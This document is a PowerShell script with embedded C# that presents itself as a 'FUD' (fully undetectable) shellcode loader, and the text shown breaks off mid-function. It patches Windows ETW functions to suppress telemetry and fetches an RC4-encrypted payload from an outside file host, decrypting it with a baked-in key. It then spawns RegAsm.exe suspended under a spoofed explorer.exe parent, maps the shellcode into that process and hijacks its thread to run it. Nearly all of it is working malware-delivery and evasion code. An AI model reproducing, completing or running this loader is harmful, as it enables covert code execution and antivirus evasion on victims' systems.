# ============================================================================
#  FUD EXTREME // PowerShell shellcode loader (x86 payload) - v4
#  --------------------------------------------------------------------------
#  v4 change: the loader now consumes an FDX1/RC4 artifact instead of raw
#  shellcode. On the wire and in the PowerShell heap there is ciphertext
#  ONLY; the body is RC4-decrypted on the fly, chunk by chunk, straight into
#  the shared section pages (scratch buffer cleared per chunk). Raw
#  shellcode never exists inside this process as a managed buffer.
#     artifact   : "FDX1" || RC4(key, shellcode)     (length preserved)
#     encrypter  : shellcode_encrypter.py            (Python; RC4 + roundtrip)
#     key default: see -Key below (32 bytes, hex)
#  keeps from v3: suspended spawn -> section handoff (no cross-process
#  write) -> WOW64 context hijack (EIP -> payload) -> survival audit.
#  keeps from v2: parent spoof, plausible regasm cmdline, Defender log sweep.
#  --------------------------------------------------------------------------
#  run    : powershell -NoP -W Hidden -ExecutionPolicy Bypass -File loader.ps1
#  knobs  : -Url <artifact>   override artifact URL (must be an FDX1 file)
#           -Target <exe>     override 32-bit host (default: auto RegAsm x86)
#           -Key <hex>        RC4 hex key (default: the baked 32-byte key)
#  --------------------------------------------------------------------------
#  iteration hooks (not armed in v4):
#   - PAGE_EXECUTE_WRITECOPY target view if payload self-modifies memory
#   - AES-256-CTR swap-out for the RC4 body if ever needed
#   - module stomping / SEC_IMAGE ghosting if section mapping trips
#   - indirect syscalls (HellsGate/HalosGate) if API-behavior trips
# ============================================================================

param(
    [string]$Url    = 'https://files.catbox.moe/l0ng4p.enc',
    [string]$Target = '',
    [string]$Key    = '060637a45517d24b9d20cfe052de1ce10e47fdd1182a352a8ffd21f97f0a4a3f'
)

$ErrorActionPreference = 'Stop'
$script:T0 = Get-Date

function Log {
    param([string]$Sym = '[*]', [string]$Msg = '', [string]$Color = 'Gray')
    $e  = (Get-Date) - $script:T0
    $ts = '{0:00}:{1:00}.{2:000}' -f $e.Minutes, $e.Seconds, $e.Milliseconds
    Write-Host ("[$ts] {0} {1}" -f $Sym, $Msg) -ForegroundColor $Color
}

trap {
    Log 'x' ("UNHANDLED ERROR: {0}" -f $_.Exception.Message) 'Red'
    exit 1
}

Write-Host ''
Write-Host '=============================================================' -ForegroundColor Cyan
Write-Host '  FUD EXTREME // PowerShell shellcode loader   [x86 payload]' -ForegroundColor Cyan
Write-Host '  v4 :: RC4-artifact handoff - heap never holds raw shellcode' -ForegroundColor DarkCyan
Write-Host '=============================================================' -ForegroundColor Cyan
Write-Host ''

# ============================================================================
#  STAGE 1 : ETW patch (current process, before anything else runs)
# ============================================================================
Log '[1/3]' 'STAGE 1 - ETW patch (ntdll, current process)' 'Cyan'

$etwSrc = @'
using System;
using System.Runtime.InteropServices;

public static class Etw
{
    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32", SetLastError = true)]
    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static string Patch(string fn)
    {
        IntPtr ntdll = GetModuleHandle("ntdll.dll");
        if (ntdll == IntPtr.Zero)
            return "ERR|ntdll.dll not mapped";
        IntPtr addr = GetProcAddress(ntdll, fn);
        if (addr == IntPtr.Zero)
            return "SKIP|" + fn + " not exported";
        uint oldProt;
        if (!VirtualProtect(addr, (UIntPtr)4, 0x40, out oldProt))
            return "ERR|VirtualProtect failed on " + fn + " (win32 " + Marshal.GetLastWin32Error() + ")";
        byte[] patch = new byte[] { 0x33, 0xC0, 0xC3 };   // xor eax,eax ; ret
        Marshal.Copy(patch, 0, addr, patch.Length);
        uint dummy;
        VirtualProtect(addr, (UIntPtr)4, oldProt, out dummy);
        return "OK|" + fn + " @ 0x" + addr.ToInt64().ToString("X");
    }
}
'@

try {
    Add-Type -TypeDefinition $etwSrc -ErrorAction Stop
    Log '+' 'ETW patcher compiled (csc)' 'DarkGreen'
}
catch {
    Log 'x' ("Add-Type failed: {0}" -f $_.Exception.Message) 'Red'
    exit 1
}

$patched = 0
foreach ($fn in 'EtwEventWrite','EtwEventWriteEx','EtwEventWriteFull','EtwEventWriteTransfer') {
    $r = [Etw]::Patch($fn)
    $tag, $msg = ($r -split '\|', 2)
    switch ($tag) {
        'OK'    { Log '+' $msg 'Green'; $patched++ }
        'SKIP'  { Log '!' $msg 'Yellow' }
        default { Log '!' $r 'Red' }
    }
}
Log '+' ("ETW patched: {0}/4 export(s)" -f $patched) 'Green'
Write-Host ''

# ============================================================================
#  STAGE 2 : in-memory artifact fetch + key load
# ============================================================================
Log '[2/3]' 'STAGE 2 - in-memory artifact fetch (ciphertext only)' 'Cyan'
Log '[*]' ("URL: {0}" -f $Url) 'Gray'

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$payload = $null
$ctype   = $null
$swFetch = [Diagnostics.Stopwatch]::StartNew()
for ($try = 1; $try -le 4; $try++) {
    try {
        $wc = New-Object Net.WebClient
        try { $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)') } catch { }
        $payload = $wc.DownloadData($Url)
        try { $ctype = $wc.ResponseHeaders['Content-Type'] } catch { }
        if ($null -ne $payload -and $payload.Length -gt 0) { break }
        Log '!' ("attempt {0}: server returned 0 bytes - retrying" -f $try) 'Yellow'
    }
    catch {
        Log '!' ("attempt {0} failed: {1}" -f $try, $_.Exception.Message) 'Yellow'
    }
    Start-Sleep -Milliseconds 1500
}
$swFetch.Stop()
if ($null -eq $payload -or $payload.Length -eq 0) {
    Log 'x' 'artifact fetch failed or server returned 0 bytes after 4 attempts - abort' 'Red'
    exit 1
}
if ($ctype -and $ctype -match 'text/html') {
    Log 'x' ("server returned an HTML page ({0}) - URL is dead" -f $ctype) 'Red'
    exit 1
}
if (-not ($payload.Length -gt 8 -and $payload[0] -eq 0x46 -and $payload[1] -eq 0x44 -and $payload[2] -eq 0x58 -and $payload[3] -eq 0x31)) {
    Log 'x' 'payload is not an FDX1 encrypted artifact - upload nfasiv.enc and pass its URL with -Url' 'Red'
    exit 1
}
Log '+' ("fetched {0} bytes ciphertext in {1} ms (memory only)" -f $payload.Length, $swFetch.ElapsedMilliseconds) 'Green'
if ($ctype) { Log '[*]' ("content-type: {0}" -f $ctype) 'DarkGray' }
$preview = ($payload[0..([Math]::Min(15, $payload.Length - 1))] | ForEach-Object { $_.ToString('X2') }) -join ' '
Log '[*]' ("cipher head: {0}" -f $preview) 'DarkGray'
Log '+' 'artifact recognized (FDX1) - heap will only ever hold ciphertext' 'Green'

if (($Key.Length % 2) -ne 0 -or $Key.Length -lt 16) {
    Log 'x' 'invalid -Key (even-length hex, at least 8 bytes) - abort' 'Red'
    exit 1
}
$keyBytes = New-Object byte[] ($Key.Length / 2)
try {
    for ($i = 0; $i -lt $keyBytes.Length; $i++) { $keyBytes[$i] = [Convert]::ToByte($Key.Substring($i * 2, 2), 16) }
}
catch {
    Log 'x' 'invalid -Key hex - abort' 'Red'
    exit 1
}
Log '[*]' ("RC4 key loaded: {0} bytes" -f $keyBytes.Length) 'DarkGray'
Write-Host ''

# ============================================================================
#  STAGE 3 : suspended spawn + section map + decrypt-on-write + hijack
# ============================================================================
Log '[3/3]' 'STAGE 3 - suspended spawn + section map + context hijack' 'Cyan'

function Get-PeMachine {
    param([string]$Path)
    $b = [IO.File]::ReadAllBytes($Path)
    if ($b.Length -lt 0x40 -or $b[0] -ne 0x4D -or $b[1] -ne 0x5A) { throw 'not a PE file' }
    $e = [BitConverter]::ToInt32($b, 0x3C)
    return [BitConverter]::ToUInt16($b, $e + 4)
}

if (-not $Target) {
    $cands = @(
        (Join-Path $env:WINDIR 'Microsoft.NET\Framework\v4.0.30319\RegAsm.exe'),
        (Join-Path $env:WINDIR 'Microsoft.NET\Framework\v2.0.50727\RegAsm.exe')
    )
    $Target = $cands | Where-Object { Test-Path -LiteralPath $_ } | Select-Object -First 1
}
if (-not $Target -or -not (Test-Path -LiteralPath $Target)) {
    Log 'x' 'no 32-bit host found (pass -Target <path to x86 exe>)' 'Red'
    exit 1
}
Log '[*]' ("host: {0}" -f $Target) 'Gray'
try {
    $machine = Get-PeMachine $Target
    if ($machine -eq 0x14C) {
        Log '+' 'PE machine: 0x14C I386 (32-bit) - matches x86 payload' 'Green'
    }
    elseif ($machine -eq 0x8664) {
        Log '!' 'PE machine: 0x8664 AMD64 - WRONG bitness for x86 shellcode' 'Yellow'
    }
    else {
        Log '!' ("PE machine: 0x{0:X} (unrecognized)" -f $machine) 'Yellow'
    }
}
catch {
    Log '!' ("PE check failed: {0}" -f $_.Exception.Message) 'Yellow'
}

$injSrc = @'
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

public static class HostExec
{
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFOEX
    {
        public STARTUPINFO si;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct WOW64_FLOATSAVE
    {
        public uint ControlWord;
        public uint StatusWord;
        public uint TagWord;
        public uint ErrorOffset;
        public uint ErrorSelector;
        public uint DataOffset;
        public uint DataSelector;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
        public byte[] RegisterArea;
        public uint Cr0NpxState;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct WOW64_CONTEXT
    {
        public uint ContextFlags;
        public uint Dr0;
        public uint Dr1;
        public uint Dr2;
        public uint Dr3;
        public uint Dr6;
        public uint Dr7;
        public WOW64_FLOATSAVE FloatSave;
        public uint SegGs;
        public uint SegFs;
        public uint SegEs;
        public uint SegDs;
        public uint Edi;
        public uint Esi;
        public uint Ebx;
        public uint Edx;
        public uint Ecx;
        public uint Eax;
        public uint Ebp;
        public uint Eip;
        public uint SegCs;
        public uint EFlags;
        public uint Esp;
        public uint SegSs;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
        public byte[] ExtendedRegisters;
    }

    private class Rc4
    {
        private byte[] s = new byte[256];
        private int i;
        private int j;

        public Rc4(byte[] key)
        {
            for (int k = 0; k < 256; k++) s[k] = (byte)k;
            int jj = 0;
            for (int k = 0; k < 256; k++)
            {
                jj = (jj + s[k] + key[k % key.Length]) & 0xFF;
                byte t = s[k]; s[k] = s[jj]; s[jj] = t;
            }
            i = 0;
            j = 0;
        }

        public void Apply(byte[] src, int srcOff, byte[] dst, int count)
        {
            for (int k = 0; k < count; k++)
            {
                i = (i + 1) & 0xFF;
                j = (j + s[i]) & 0xFF;
                byte t = s[i]; s[i] = s[j]; s[j] = t;
                dst[k] = (byte)(src[srcOff + k] ^ s[(s[i] + s[j]) & 0xFF]);
            }
        }
    }

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr h, string name);

    [DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string name);

    [DllImport("kernel32", SetLastError = true)]
    private static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

    [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool CreateProcessW(string app, string cmd, IntPtr pa, IntPtr ta, bool inherit,
        uint flags, IntPtr env, string cwd, ref STARTUPINFOEX si, out PROCESS_INFORMATION pi);

    [DllImport("kernel32", SetLastError = true)]
    private static extern bool InitializeProcThreadAttributeList(IntPtr list, int count, int flags, ref IntPtr size);

    [DllImport("kernel32", SetLastError = true)]
    private static extern bool UpdateProcThreadAttribute(IntPtr list, uint flags, IntPtr attr, IntPtr value,
        IntPtr size, IntPtr prev, IntPtr ret);

    [DllImport("kernel32", SetLastError = true)]
    private static extern void DeleteProcThreadAttributeList(IntPtr list);

    [DllImport("kernel32", SetLastError = true)]
    private static extern bool Wow64GetThreadContext(IntPtr hThread, ref WOW64_CONTEXT lpContext);

    [DllImport("kernel32", SetLastError = true)]
    private static extern bool Wow64SetThreadContext(IntPtr hThread, ref WOW64_CONTEXT lpContext);

    [DllImport("kernel32", SetLastError = true)]
    private static extern uint ResumeThread(IntPtr thread);

    [DllImport("kernel32", SetLastError = true)]
    private static extern uint WaitForSingleObject(IntPtr handle, uint ms);

    [DllImport("kernel32", SetLastError = true)]
    private static extern bool GetExitCodeProcess(IntPtr proc, out uint code);

    [DllImport("kernel32", SetLastError = true)]
    private static extern bool TerminateProcess(IntPtr proc, uint code);

    [DllImport("kernel32", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr h);

    private delegate int NtCreateSectionDel(ref IntPtr hSection, uint access, IntPtr objAttr,
        ref long maxSize, uint pageProt, uint allocAttr, IntPtr file);

    private delegate int NtMapViewDel(IntPtr hSection, IntPtr hProcess, ref IntPtr baseAddr, IntPtr zeroBits,
        IntPtr commitSize, IntPtr sectionOffset, ref IntPtr viewSize, uint inherit, uint allocType, uint protect);

    private delegate int NtUnmapViewDel(IntPtr hProcess, IntPtr baseAddr);

    private static NtCreateSectionDel _ntCreateSection;
    private static NtMapViewDel _ntMapView;
    private static NtUnmapViewDel _ntUnmapView;

    private static bool Resolve()
    {
        if (_ntCreateSection != null) return true;
        IntPtr ntdll = GetModuleHandle("ntdll.dll");
        if (ntdll == IntPtr.Zero) return false;
        IntPtr p1 = GetProcAddress(ntdll, "Nt" + "Create" + "Section");
        IntPtr p2 = GetProcAddress(ntdll, "Nt" + "Map" + "ViewOfSection");
        IntPtr p3 = GetProcAddress(ntdll, "Nt" + "Unmap" + "ViewOfSection");
        if (p1 == IntPtr.Zero || p2 == IntPtr.Zero || p3 == IntPtr.Zero) return false;
        _ntCreateSection = (NtCreateSectionDel)Marshal.GetDelegateForFunctionPointer(p1, typeof(NtCreateSectionDel));
        _ntMapView = (NtMapViewDel)Marshal.GetDelegateForFunctionPointer(p2, typeof(NtMapViewDel));
        _ntUnmapView = (NtUnmapViewDel)Marshal.GetDelegateForFunctionPointer(p3, typeof(NtUnmapViewDel));
        return true;
    }

    private static string NtStatus(int st)
    {
        return "0x" + ((uint)st).ToString("X8");
    }

    private static string ExitNote(uint code)
    {
        if (code == 0) return "clean exit (0) - payload may have detached or completed";
        if (code == 0xC0000005) return "0xC0000005 access violation - payload crash or forced termination";
        if (code == 0xC000001D) return "0xC000001D illegal instruction";
        if (code == 0xC0000409) return "0xC0000409 stack overflow / fast-fail";
        if (code == 0xFFFFFFFF) return "0xFFFFFFFF TerminateProcess(-1) - typical of an AV kill or parent kill";
        return "unusual code - treat as external termination until proven otherwise";
    }

    private static byte[] HexToBytes(string h)
    {
        byte[] b = new byte[h.Length / 2];
        for (int i = 0; i < b.Length; i++) b[i] = Convert.ToByte(h.Substring(i * 2, 2), 16);
        return b;
    }

    private static byte[] Rc4One(byte[] key, byte[] data)
    {
        Rc4 r = new Rc4(key);
        byte[] o = new byte[data.Length];
        r.Apply(data, 0, o, data.Length);
        return o;
    }

    private static string BytesToHex(byte[] b)
    {
        StringBuilder sb = new StringBuilder(b.Length * 2);
        for (int i = 0; i < b.Length; i++) sb.Append(b[i].ToString("X2"));
        return sb.ToString();
    }

    public static string[] CompareArtifact(string encPath, string plainPath, string keyHex)
    {
        return VerifyArtifactAgainstBuffer(encPath, File.ReadAllBytes(plainPath), keyHex);
    }

    public static string[] VerifyArtifactAgainstBuffer(string encPath, byte[] plainBuf, string keyHex)
    {
        List<string> r = new List<string>();
        byte[] enc = File.ReadAllBytes(encPath);
        if (enc.Length < 8 || enc[0] != 0x46 || enc[1] != 0x44 || enc[2] != 0x58 || enc[3] != 0x31)
        {
            r.Add("err|artifact magic missing in " + encPath);
            return r.ToArray();
        }
        if (enc.Length - 4 != plainBuf.Length)
        {
            r.Add("err|length mismatch: artifact body " + (enc.Length - 4) + " vs buffer " + plainBuf.Length);
            return r.ToArray();
        }
        byte[] key = HexToBytes(keyHex);
        byte[] dec = new byte[enc.Length - 4];
        Rc4 rc = new Rc4(key);
        byte[] scratch = new byte[65536];
        int done = 0;
        while (done < dec.Length)
        {
            int n = Math.Min(scratch.Length, dec.Length - done);
            rc.Apply(enc, 4 + done, scratch, n);
            Buffer.BlockCopy(scratch, 0, dec, done, n);
            done += n;
        }
        bool same = true;
        for (int k = 0; k < dec.Length; k++) { if (dec[k] != plainBuf[k]) { same = false; break; } }
        r.Add(same ? "ok|C# decrypt == downloaded original (" + dec.Length + " bytes)" : "err|decrypted bytes differ from the original");
        r.Add("info|decrypted head: " + dec[0].ToString("X2") + " " + dec[1].ToString("X2") + " " + dec[2].ToString("X2") + " " + dec[3].ToString("X2"));
        return r.ToArray();
    }

    public static string[] Selftest()
    {
        List<string> l = new List<string>();
        IntPtr hSec = IntPtr.Zero;
        IntPtr view1 = IntPtr.Zero;
        IntPtr view2 = IntPtr.Zero;
        try
        {
            int csz = Marshal.SizeOf(typeof(WOW64_CONTEXT));
            l.Add(csz == 716 ? "ok|WOW64_CONTEXT size = 716 (0x2CC)" : "err|WOW64_CONTEXT size " + csz + " != 716");
            try
            {
                long offEip = Marshal.OffsetOf(typeof(WOW64_CONTEXT), "Eip").ToInt64();
                l.Add(offEip == 0xB8 ? "ok|WOW64_CONTEXT.Eip @ 0xB8" : "err|Eip offset 0x" + offEip.ToString("X"));
            }
            catch (Exception)
            {
                l.Add(csz == 716 ? "warn|OffsetOf(Eip) unavailable - size check governs" : "err|OffsetOf(Eip) unavailable and size check failed");
            }

            bool vok = true;
            vok = vok && (BytesToHex(Rc4One(Encoding.ASCII.GetBytes("Key"), Encoding.ASCII.GetBytes("Plaintext"))) == "BBF316E8D940AF0AD3");
            vok = vok && (BytesToHex(Rc4One(Encoding.ASCII.GetBytes("Wiki"), Encoding.ASCII.GetBytes("pedia"))) == "1021BF0420");
            vok = vok && (BytesToHex(Rc4One(Encoding.ASCII.GetBytes("Secret"), Encoding.ASCII.GetBytes("Attack at dawn"))) == "45A01F645FC35B383552544B9BF5");
            l.Add(vok ? "ok|RC4 known-answer vectors (3/3)" : "err|RC4 known-answer vector mismatch");

            if (!Resolve()) { l.Add("err|ntdll section functions not resolvable"); return l.ToArray(); }

            long size = 0x10000;
            int st = _ntCreateSection(ref hSec, 0x000F001F, IntPtr.Zero, ref size, 0x40, 0x08000000, IntPtr.Zero);
            if (st != 0) { l.Add("err|NtCreateSection -> " + NtStatus(st)); return l.ToArray(); }
            l.Add("ok|NtCreateSection (64 KB, SEC_COMMIT, pagefile-backed)");

            IntPtr b1 = IntPtr.Zero;
            IntPtr vs1 = IntPtr.Zero;
            st = _ntMapView(hSec, new IntPtr(-1), ref b1, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref vs1, 2, 0, 0x04);
            if (st != 0) { l.Add("err|self map RW -> " + NtStatus(st)); return l.ToArray(); }
            view1 = b1;
            l.Add("ok|self view (RW) @ 0x" + b1.ToInt64().ToString("X"));

            byte[] probe = new byte[64];
            for (int i = 0; i < 64; i++) probe[i] = (byte)((i * 7 + 1) & 0xFF);
            Marshal.Copy(probe, 0, view1, probe.Length);

            IntPtr b2 = IntPtr.Zero;
            IntPtr vs2 = IntPtr.Zero;
            st = _ntMapView(hSec, new IntPtr(-1), ref b2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref vs2, 2, 0, 0x20);
            if (st != 0) { l.Add("err|self map RX -> " + NtStatus(st)); return l.ToArray(); }
            view2 = b2;
            l.Add("ok|self view (RX) @ 0x" + b2.ToInt64().ToString("X"));

            byte[] back = new byte[64];
            Marshal.Copy(view2, back, 0, back.Length);
            bool same = true;
            for (int i = 0; i < 64; i++) { if (back[i] != probe[i]) { same = false; break; } }
            l.Add(same ? "ok|RX view reads identical data - shared pages verified" : "err|VIEW DATA MISMATCH");

            IntPtr sz = IntPtr.Zero;
            InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref sz);
            if (sz == IntPtr.Zero)
            {
                l.Add("err|attribute list size query failed");
            }
            else
            {
                IntPtr al = Marshal.AllocHGlobal(sz);
                if (InitializeProcThreadAttributeList(al, 1, 0, ref sz))
                {
                    IntPtr v = Marshal.AllocHGlobal(IntPtr.Size);
                    Marshal.WriteIntPtr(v, Process.GetCurrentProcess().Handle);
                    bool okU = UpdateProcThreadAttribute(al, 0, (IntPtr)0x00020000, v, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
                    l.Add(okU ? "ok|UpdateProcThreadAttribute (PPID) accepted" : "err|UpdateProcThreadAttribute failed win32 " + Marshal.GetLastWin32Error());
                    Marshal.FreeHGlobal(v);
                    DeleteProcThreadAttributeList(al);
                }
                else
                {
                    l.Add("err|InitializeProcThreadAttributeList failed win32 " + Marshal.GetLastWin32Error());
                }
                Marshal.FreeHGlobal(al);
            }
            return l.ToArray();
        }
        finally
        {
            if (view2 != IntPtr.Zero && _ntUnmapView != null) _ntUnmapView(new IntPtr(-1), view2);
            if (view1 != IntPtr.Zero && _ntUnmapView != null) _ntUnmapView(new IntPtr(-1), view1);
            if (hSec != IntPtr.Zero) CloseHandle(hSec);
        }
    }

    public static string[] Run(string targetPath, byte[] payload, byte[] key)
    {
        List<string> log = new List<string>();

        const uint CREATE_SUSPENDED = 0x00000004;
        const uint CREATE_NO_WINDOW = 0x08000000;
        const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        const uint SECTION_ALL_ACCESS = 0x000F001F;
        const uint SEC_COMMIT = 0x08000000;
        const uint PAGE_READWRITE = 0x04;
        const uint PAGE_EXECUTE_READ = 0x20;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint PROCESS_CREATE_PROCESS = 0x0080;
        const uint WOW64_CONTEXT_CONTROL = 0x00010001;
        const uint WAIT_OBJECT_0 = 0x00000000;

        if (payload.Length < 8 || payload[0] != 0x46 || payload[1] != 0x44 || payload[2] != 0x58 || payload[3] != 0x31)
        {
            log.Add("err|artifact magic mismatch (not FDX1) - refusing to stage");
            return log.ToArray();
        }
        int plainLen = payload.Length - 4;

        if (!Resolve()) { log.Add("err|ntdll section functions not resolvable"); return log.ToArray(); }

        IntPtr parentHandle = IntPtr.Zero;
        int explorerPid = 0;
        bool spoof = false;
        try
        {
            Process[] exps = Process.GetProcessesByName("explorer");
            if (exps.Length > 0) explorerPid = exps[0].Id;
        }
        catch { }
        if (explorerPid != 0) parentHandle = OpenProcess(PROCESS_CREATE_PROCESS, false, explorerPid);
        if (parentHandle != IntPtr.Zero) spoof = true;
        log.Add(spoof
            ? "ok|parent-spoof handoff prepared (explorer.exe PID " + explorerPid + ")"
            : "warn|parent spoof unavailable - falling back to real parent");

        STARTUPINFOEX siex = new STARTUPINFOEX();
        siex.si.cb = Marshal.SizeOf(typeof(STARTUPINFOEX));
        siex.si.dwFlags = 0x1;
        siex.si.wShowWindow = 0;
        siex.lpAttributeList = IntPtr.Zero;

        IntPtr attrList = IntPtr.Zero;
        IntPtr attrValue = IntPtr.Zero;
        uint flags = CREATE_SUSPENDED | CREATE_NO_WINDOW;
        if (spoof)
        {
            IntPtr sz = IntPtr.Zero;
            InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref sz);
            if (sz != IntPtr.Zero)
            {
                attrList = Marshal.AllocHGlobal(sz);
                if (InitializeProcThreadAttributeList(attrList, 1, 0, ref sz))
                {
                    attrValue = Marshal.AllocHGlobal(IntPtr.Size);
                    Marshal.WriteIntPtr(attrValue, parentHandle);
                    if (UpdateProcThreadAttribute(attrList, 0, (IntPtr)0x00020000, attrValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero))
                    {
                        siex.lpAttributeList = attrList;
                        flags |= EXTENDED_STARTUPINFO_PRESENT;
                        log.Add("ok|STARTUPINFOEX armed (PPID attribute set)");
                    }
                    else
                    {
                        log.Add("warn|UpdateProcThreadAttribute failed (win32 " + Marshal.GetLastWin32Error() + ") - creating without spoof");
                    }
                }
                else
                {
                    log.Add("warn|attribute list init failed (win32 " + Marshal.GetLastWin32Error() + ")");
                }
            }
        }

        string regfile = Path.Combine(Path.GetTempPath(), "svcreg.tmp");
        string cmd = "\"" + targetPath + "\" /nologo /silent /regfile:\"" + regfile + "\"";
        log.Add("info|cmdline: " + cmd);

        PROCESS_INFORMATION pi;
        bool created = CreateProcessW(targetPath, cmd, IntPtr.Zero, IntPtr.Zero, false, flags,
                                      IntPtr.Zero, null, ref siex, out pi);

        if (attrList != IntPtr.Zero) { DeleteProcThreadAttributeList(attrList); Marshal.FreeHGlobal(attrList); }
        if (attrValue != IntPtr.Zero) Marshal.FreeHGlobal(attrValue);
        if (parentHandle != IntPtr.Zero) { CloseHandle(parentHandle); parentHandle = IntPtr.Zero; }

        if (!created)
        {
            log.Add("err|CreateProcessW failed (win32 " + Marshal.GetLastWin32Error() + ")");
            return log.ToArray();
        }
        log.Add("ok|host spawned suspended - PID " + pi.dwProcessId + " / TID " + pi.dwThreadId);

        bool bad = false;
        IntPtr hSec = IntPtr.Zero;
        IntPtr localView = IntPtr.Zero;
        IntPtr targetView = IntPtr.Zero;

        long secSize = plainLen;
        int st = _ntCreateSection(ref hSec, SECTION_ALL_ACCESS, IntPtr.Zero, ref secSize,
                                  PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);
        if (st != 0)
        {
            log.Add("err|NtCreateSection -> " + NtStatus(st));
            bad = true;
        }
        else
        {
            log.Add("ok|section created (" + plainLen + " bytes shellcode, pagefile-backed)");
        }

        if (!bad)
        {
            IntPtr b = IntPtr.Zero;
            IntPtr vs = IntPtr.Zero;
            st = _ntMapView(hSec, new IntPtr(-1), ref b, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref vs, 2, 0, PAGE_READWRITE);
            if (st != 0)
            {
                log.Add("err|loader view map (RW) -> " + NtStatus(st));
                bad = true;
            }
            else
            {
                localView = b;
                log.Add("ok|loader view (RW) @ 0x" + b.ToInt64().ToString("X"));
                Rc4 rc = new Rc4(key);
                byte[] scratch = new byte[65536];
                int done = 0;
                while (done < plainLen)
                {
                    int n = Math.Min(scratch.Length, plainLen - done);
                    rc.Apply(payload, 4 + done, scratch, n);
                    Marshal.Copy(scratch, 0, IntPtr.Add(localView, done), n);
                    Array.Clear(scratch, 0, n);
                    done += n;
                }
                log.Add("ok|RC4 decrypted directly into shared pages (" + plainLen + " bytes) - heap never held plaintext");
            }
        }

        if (!bad)
        {
            IntPtr b = IntPtr.Zero;
            IntPtr vs = IntPtr.Zero;
            st = _ntMapView(hSec, pi.hProcess, ref b, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref vs, 2, 0, PAGE_EXECUTE_READ);
            if (st != 0)
            {
                log.Add("err|target view map (RX) -> " + NtStatus(st));
                bad = true;
            }
            else if (b.ToInt64() >= 0x100000000L)
            {
                targetView = b;
                log.Add("err|target view landed above 4 GB - x86 payload cannot run there");
                bad = true;
            }
            else
            {
                targetView = b;
                log.Add("ok|target view (RX) mapped into regasm @ 0x" + b.ToInt64().ToString("X8"));
            }
        }

        if (localView != IntPtr.Zero)
        {
            _ntUnmapView(new IntPtr(-1), localView);
            localView = IntPtr.Zero;
            log.Add("info|loader view unmapped - decrypted pages no longer addressable here");
        }
        if (hSec != IntPtr.Zero) { CloseHandle(hSec); hSec = IntPtr.Zero; }

        if (!bad)
        {
            WOW64_CONTEXT ctx = new WOW64_CONTEXT();
            ctx.ContextFlags = WOW64_CONTEXT_CONTROL;
            if (!Wow64GetThreadContext(pi.hThread, ref ctx))
            {
                log.Add("err|Wow64GetThreadContext failed (win32 " + Marshal.GetLastWin32Error() + ")");
                bad = true;
            }
            else
            {
                log.Add("ok|thread context captured (initial EIP 0x" + ctx.Eip.ToString("X8") + ")");
                ctx.Eip = (uint)targetView.ToInt64();
                if (!Wow64SetThreadContext(pi.hThread, ref ctx))
                {
                    log.Add("err|Wow64SetThreadContext failed (win32 " + Marshal.GetLastWin32Error() + ")");
                    bad = true;
                }
                else
                {
                    log.Add("ok|context hijack armed: EIP -> 0x" + ctx.Eip.ToString("X8"));
                }
            }
        }

        if (!bad)
        {
            uint prev = ResumeThread(pi.hThread);
            if (prev == 0xFFFFFFFF)
            {
                log.Add("err|ResumeThread failed (win32 " + Marshal.GetLastWin32Error() + ")");
                bad = true;
            }
            else
            {
                log.Add("ok|resumed - thread starts directly at the payload entry");
            }
        }

        if (bad)
        {
            if (targetView != IntPtr.Zero) _ntUnmapView(pi.hProcess, targetView);
            TerminateProcess(pi.hProcess, 0);
            log.Add("info|suspended host terminated (cleanup)");
        }
        else
        {
            bool exited = false;
            uint exitCode = 0;
            for (int k = 1; k <= 5; k++)
            {
                uint w = WaitForSingleObject(pi.hProcess, 2000);
                if (w == WAIT_OBJECT_0)
                {
                    exited = true;
                    GetExitCodeProcess(pi.hProcess, out exitCode);
                    log.Add("err|regasm EXITED at ~+" + (k * 2) + "s - exit code 0x" + exitCode.ToString("X8"));
                    break;
                }
                string eipTxt = "n/a";
                WOW64_CONTEXT mc = new WOW64_CONTEXT();
